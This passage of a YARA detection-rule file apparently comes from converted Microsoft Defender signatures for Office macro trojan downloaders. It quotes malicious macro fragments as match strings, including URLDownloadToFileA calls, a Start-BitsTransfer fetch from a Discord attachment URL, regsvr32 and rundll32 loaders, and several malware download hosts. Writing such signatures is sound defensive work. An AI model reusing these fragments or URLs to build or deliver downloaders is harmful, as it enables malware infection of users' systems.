        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c 4c 69 6e 6b 73 5c 05 06 09 06 06 08 64 65 73 69 67 6e 64 65 70 65 6e 64 61 6e 74 64 65 6e 69 61 6c 64 65 66 65 6e 64 64 65 63 69 73 69 76 65 2e (6c|64) 22}  //weight: 2, accuracy: Low
        $x_2_2 = ".deletefile (Environ(\"USERPROFILE\") + \"\\Links\\*.lnk\")" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKM_2147779222_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKM!MTB"
        threat_id = "2147779222"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "url=\"https://www.may-bnk2u.com/files/enquiry.zip" ascii //weight: 1
        $x_1_2 = "c:\\users\\\"&environ(\"username\")&\"\\documents\\\"&\"enquiry.exe" ascii //weight: 1
        $x_1_3 = "downloadtofilelib\"urlmon\"alias\"urldownloadtofilea" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKM_2147779222_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKM!MTB"
        threat_id = "2147779222"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-w hi s^leep -Se 31;Start-BitsTr^an^sfer -Source" ascii //weight: 1
        $x_2_2 = "htt`ps://cdn.discordapp.com/attachments/913498999456137280/924940505517785118/Downloader.e`xe" ascii //weight: 2
        $x_1_3 = "C:\\Users\\Public\\Documents\\usemorning.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_VISA_2147780257_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VISA!MTB"
        threat_id = "2147780257"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function tg()" ascii //weight: 1
        $x_1_2 = ".exec tg" ascii //weight: 1
        $x_1_3 = "Option Explicit" ascii //weight: 1
        $x_1_4 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_5 = "= Split(frm.tg, \" \")" ascii //weight: 1
        $x_1_6 = "frm.button1_Click" ascii //weight: 1
        $x_1_7 = "verse().join(" ascii //weight: 1
        $x_1_8 = "oveTo(-100, -" ascii //weight: 1
        $x_1_9 = "zeTo(1, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_IOCB_2147780837_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.IOCB!MTB"
        threat_id = "2147780837"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 55 73 65 72 46 6f 72 6d 31 2e 54 65 78 74 42 6f 78 31 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "= Replace(\"1BOM\", \"1\", \"AccessV\")" ascii //weight: 1
        $x_1_3 = ".Documents.Add.VBProject.VBComponents(\"ThisDocument\").CodeModule" ascii //weight: 1
        $x_1_4 = "= \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NZKB_2147780954_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NZKB!MTB"
        threat_id = "2147780954"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(IXN6ayMY5RjMID5, jUDXwX_Pyw_qrOj_)" ascii //weight: 1
        $x_1_2 = "= CreateObject(ICOlPI_wXboiG5A5)" ascii //weight: 1
        $x_1_3 = "= \"fdsfgfd  hgfdfhg  hgfgjf fsd dfasfew\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_MOBI_2147781047_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.MOBI!MTB"
        threat_id = "2147781047"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 69 74 6c 65 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 74 69 74 6c 65 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 6e 74 20 23 31 2c 20 [0-32] 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = "= GetObject(StrReverse(\"0883F19C0A00-5548-1D11-1A2F-09DFA80C:wen\"))" ascii //weight: 1
        $x_1_4 = {3d 20 63 6f 75 6e 74 4c 65 66 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 74 65 78 74 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 63 6f 6e 73 74 4c 6f 61 64 43 61 70 74 69 6f 6e 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 2e 74 65 78 74 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 4e 61 76 69 67 61 74 65 32 20 74 69 74 6c 65 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SNKQ_2147782158_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SNKQ!MTB"
        threat_id = "2147782158"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Function wR7N5QQ(ghQrLY As String) As String" ascii //weight: 1
        $x_1_2 = "Set a9zWGWcrM = CreateObject(\"VBScript.RegExp\")" ascii //weight: 1
        $x_1_3 = "IwDU5vPSB = Array(ghQrLY)" ascii //weight: 1
        $x_1_4 = "With a9zWGWcrM" ascii //weight: 1
        $x_1_5 = ".Pattern = \"j|Q|L|I|F|v|D|B|T|q|w|H|z|Z|O|X|Y|P|G|M|N\"" ascii //weight: 1
        $x_1_6 = ".Global = True" ascii //weight: 1
        $x_1_7 = "End With" ascii //weight: 1
        $x_1_8 = {77 52 37 4e 35 51 51 20 3d 20 61 39 7a 57 47 57 63 72 4d 2e 52 65 70 6c 61 63 65 28 49 77 44 55 35 76 50 53 42 28 30 29 2c 20 22 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PVDS_2147782646_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PVDS!MTB"
        threat_id = "2147782646"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "26"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "6945UoWFIAKkc9a2biSSzcq3nG4" ascii //weight: 1
        $x_1_2 = "stXH0fSgKi9YPGIaetv3OhZxpvk" ascii //weight: 1
        $x_1_3 = "0dSBRNun" ascii //weight: 1
        $x_1_4 = "Wv3LFKcPScKDMqBLI2Op" ascii //weight: 1
        $x_1_5 = "KUkcN5TC3hrKecwpm" ascii //weight: 1
        $x_1_6 = "hpswSHUe" ascii //weight: 1
        $x_1_7 = "sYSbG3Z0FdCKZ9L1ZXvvAj" ascii //weight: 1
        $x_1_8 = "t5VjlM" ascii //weight: 1
        $x_1_9 = "g33MP9ffBlvoSKY0ufMje2W5Vj" ascii //weight: 1
        $x_1_10 = "eIoYGgRNdMkz6bdpzylGdz" ascii //weight: 1
        $x_1_11 = "LuJ1XBrog82pdW2mfOXErLY6ju" ascii //weight: 1
        $x_1_12 = "GzChTPGo" ascii //weight: 1
        $x_1_13 = "85OPJPfzqm9P8GyMTXtYH" ascii //weight: 1
        $x_1_14 = "0VORn5" ascii //weight: 1
        $x_1_15 = "3l9oljyZ8YPFHj3ev" ascii //weight: 1
        $x_1_16 = "7Tw0AzO7f" ascii //weight: 1
        $x_1_17 = "sh8i09fUnNr9WqJr1yDR" ascii //weight: 1
        $x_1_18 = "myPejR8262wu" ascii //weight: 1
        $x_1_19 = "sF1RbYYR" ascii //weight: 1
        $x_1_20 = "jw7owxknnSK" ascii //weight: 1
        $x_1_21 = "BKo44Rc9rBoZvb8QQ12QcZws13" ascii //weight: 1
        $x_1_22 = "lrwrTN" ascii //weight: 1
        $x_1_23 = "mrujEM7A9arQ5WKNzgT" ascii //weight: 1
        $x_1_24 = "xvCrmY6DBpuM0raxEqYME41" ascii //weight: 1
        $x_1_25 = "RCrfydrX" ascii //weight: 1
        $x_1_26 = "3PYgbk0HKII6UONrjd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSA_2147782807_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSA!MTB"
        threat_id = "2147782807"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set hmYJ = CreateObject(n1)" ascii //weight: 1
        $x_1_2 = "hmYJ.ShellExecute \"P\" + Cells(7, 1), A2, \"\", \"\", 0" ascii //weight: 1
        $x_1_3 = "rev = rev & Mid(MAKGacV, p, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_OLP_2147782952_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.OLP!MTB"
        threat_id = "2147782952"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 20 [0-4] 5c 70 6f 6c 79 31 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = "\\poly2.dll" ascii //weight: 1
        $x_1_3 = "/moon.html" ascii //weight: 1
        $x_1_4 = "URLMon" ascii //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMK_2147783728_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMK!MTB"
        threat_id = "2147783728"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ybnm.navercloud.org/mongo/rtvwiydo.gif" ascii //weight: 1
        $x_1_2 = ":ftp://mon:db@" ascii //weight: 1
        $x_1_3 = "regsvr32 /u /n /s /i" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMK_2147783728_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMK!MTB"
        threat_id = "2147783728"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 74 52 58 52 54 42 4a 56 4a 50 53 57 4a 4c 4c 4c 54 4f 52 43 42 43 42 48 42 59 44 42 49 44 47 5a 55 55 58 48 56 5a 48 4e 4e 54 47 42 58 5a 48 45 4b 4c 51 59 4f 56 46 53 4b 52 59 43 56 48 4e 59 59 42 47 4b 58 3a 2f 2f 33 38 31 40 5d 38 35 32 33 40 29 28 23 5c 2b 24 3c 35 3d 34 30 3d 23 25 34 29 36 36 25 5f 35 2a 5b 35 5e 2f 36 2d 24 5d 3c 35 32 5d 5b 28 31 38 39 40 5d 5e 3c 40 3c 28 3d 37 34 21 35 34 36 34 39 5e 36 23 31 33 32 31 40 5d 38 35 32 33 40 29 28 23 5c 2b 24 3c 35 3d 34 30 3d 23 25 34 29 36 36 25 5f 35 2a 5b 35 5e 2f 36 2d 24 5d 3c 35 32 5d 5b 28 31 38 39 40 5d 5e 3c 40 3c 28 3d 37 34 21 35 34 36 34 39 5e 36 23 31 30 31 [0-111] 34 35 2f 33 33 2f 45 6e 63 [0-111] 74 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAA_2147784675_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAA!MTB"
        threat_id = "2147784675"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 50 22 20 2b 20 [0-9] 28 [0-9] 29 2c 20 00 28 [0-15] 29 2c 20 22 22 2c 20 22 22 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = {3e 20 31 20 54 68 65 6e 0d 0a 20 20 20 73 74 72 33 20 3d 20 52 69 67 68 74 28 73 74 72 32 2c 20 31 29 20 26 20 74 65 6d 70 0d 0a 20 20 20 74 65 6d 70 20 3d 20 73 74 72 33 0d 0a 45 6e 64 20 49 66 0d 0a 4e 65 78 74 0d 0a [0-9] 20 3d 20 74 65 6d 70 20 ?? 20 61}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAB_2147784689_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAB!MTB"
        threat_id = "2147784689"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {3d 20 22 68 74 74 70 3a 2f 2f 77 77 77 2e 22 0d 0a 44 6c 6c 4d 61 69 6e 28 69 29 2e 52 75 6e 50 45 20 3d 20 22 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 68 6a 64 6b 71 6f 77 64 68 71 6f 77 64 68 22}  //weight: 1, accuracy: High
        $x_1_2 = "(Ass + Ass2 + Ass3 + Ass4)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rundll32" ascii //weight: 1
        $x_1_2 = "http://91.92.109.16/images/redtank.png" ascii //weight: 1
        $x_1_3 = "c:\\users\\public\\test.png" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "i \"\", \"cmd.exe /s /c " ascii //weight: 1
        $x_1_2 = "VBA.Shell" ascii //weight: 1
        $x_1_3 = "= Replace" ascii //weight: 1
        $x_1_4 = "c:\\\\programdata\\\\index.h" ascii //weight: 1
        $x_1_5 = "Public Sub i" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 68 22 20 26 20 [0-15] 20 26 20 22 61}  //weight: 1, accuracy: Low
        $x_1_2 = "Call VBA.Shell(html" ascii //weight: 1
        $x_1_3 = "i \"t\", \"cmd /s /k" ascii //weight: 1
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-255] 2c 20 22 [0-15] 22 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "funcCompareDefine & Mid(varI, (coreBr - i), 1)" ascii //weight: 1
        $x_1_2 = "Print #1, coreDefineTo(\"dt1yo\")" ascii //weight: 1
        $x_1_3 = "For i = 0 To coreBr - 1" ascii //weight: 1
        $x_1_4 = "Len(varI)" ascii //weight: 1
        $x_1_5 = "VBA.Shell(compareProcHtml & coreForCore)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "guhuioo ytuygy mbvmnbkiu" ascii //weight: 1
        $x_1_2 = ".Run(" ascii //weight: 1
        $x_1_3 = "vxcn nmvm kuk et ,nbn hhfgd" ascii //weight: 1
        $x_1_4 = {6f 69 75 70 28 ?? ?? ?? 29 20 26 20 6f 69 75 70 28 31 39 39 29 20 26 20 6f 69 75 70 28 31 39 30 29 20 26 20 6f 69 75 70 28 31 35 34 29 20 26 20 6f 69 75 70 28 31 36 39 29 20 26 20 6f 69 75 70 28 ?? ?? ?? 29 20 26}  //weight: 1, accuracy: Low
        $x_1_5 = "Chr(fdsg - 122)" ascii //weight: 1
        $x_1_6 = "= \"WSCript.shell\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VI_2147787265_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VI!MTB"
        threat_id = "2147787265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "obj.Open \"PO\" & \"ST\", Trim(requesUrl), False" ascii //weight: 1
        $x_1_2 = "obj.setRequestHeader \"Content-Type\", \"app\" & \"lic\" & \"ati\" & \"on/x-w\" & \"ww-f\" & \"orm-url\" & \"enc\" & \"oded" ascii //weight: 1
        $x_1_3 = "obj.send (data)" ascii //weight: 1
        $x_1_4 = "Split(lines(i), \"|\", 3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAE_2147787719_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAE!MTB"
        threat_id = "2147787719"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"feedback\"" ascii //weight: 1
        $x_1_2 = "lbound(lines,1)toubound(lines,1)fields=split(lines(i),\"|\",3)ifubound(fields)=0" ascii //weight: 1
        $x_1_3 = "process(obj.responsetext)endifendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAF_2147787779_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAF!MTB"
        threat_id = "2147787779"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb_name=\"newmacros\"sub" ascii //weight: 1
        $x_1_2 = {29 29 2e 63 72 65 61 74 65 [0-31] 2c 6e 75 6c 6c 2c 6e 75 6c 6c 2c 70 69 64 65 6e 64 73 75 62 73 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 31 74 6f 6c 65 6e 28 [0-15] 29 73 74 65 70 32 [0-15] 3d 01 26 63 68 72 24 28 76 61 6c 28 22 26 68 22 26 6d 69 64 24 28 00 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAG_2147788489_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAG!MTB"
        threat_id = "2147788489"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"mbc\"" ascii //weight: 1
        $x_1_2 = "\"wcik=wcik&\"e8aqqbbahoaqqbdadgaqqbjahcaqgb2aeeaqw" ascii //weight: 1
        $x_1_3 = ".run(vbtfsxhbhkbknehdpcvspkkqmuyuxmfhrfps,illezsfhubhdmkfjhvstvfhrkzvwln)" ascii //weight: 1
        $x_1_4 = "kui=chr(fscv-121)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAH_2147788936_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAH!MTB"
        threat_id = "2147788936"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"userform1\"a" ascii //weight: 1
        $x_1_2 = "split(strfnd,\",\")).text=split(strfnd,\",\")(i).replacement.text=\"^&\".executereplace:=wdreplaceallif.found=truethenstrrpt=strrpt&vbcr&split(strfnd,\",\")(i" ascii //weight: 1
        $x_1_3 = "timer()-tijd<2doeventswendwinexec\"cscriptc:\\programdata\\prnholl.vbe\",0endif" ascii //weight: 1
        $x_1_4 = "textstream.writeline(userform1.label1.caption)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAI_2147788966_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAI!MTB"
        threat_id = "2147788966"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c6974202d6620\")+chr(34)+chrencode(\"687474703a2f2f61706f2e70616c656e632e636c75623a323039352f6d616e642f7066303" ascii //weight: 1
        $x_1_2 = "2e657865\")callshell(" ascii //weight: 1
        $x_1_3 = "=sstr+chr(clng(\"&h\"&mid(str,i,2)))nextchrencode=sstrendfunctionsubautoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAJ_2147789000_0
{
    meta:
        author = "defender2yara"
